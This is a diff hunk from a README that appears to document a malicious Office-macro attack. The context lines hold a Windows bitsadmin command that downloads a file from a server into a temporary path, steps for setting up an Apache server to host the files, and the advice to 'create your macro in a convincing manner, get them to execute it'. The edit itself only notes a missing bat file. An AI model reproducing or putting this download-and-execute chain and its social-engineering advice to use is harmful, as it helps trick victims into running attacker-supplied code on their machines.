@@ -129,7 +129,7 @@ bitsadmin /transfer myDownloadJob3 /priority normal %DOWNLOAD_tmp% %DL_tmp%
 ```
 
 ### Server setup 
-Enable apache 2 and copy across the files from below. 
+Enable apache 2 and copy across the files from below (I forgot the bat file in the ss). 
 ![image](https://user-images.githubusercontent.com/46195001/232535184-26456e4b-9a92-439e-b8e1-5c1405b792d1.png)
 
 Create your macro in a convincing manner, get them to execute it. 
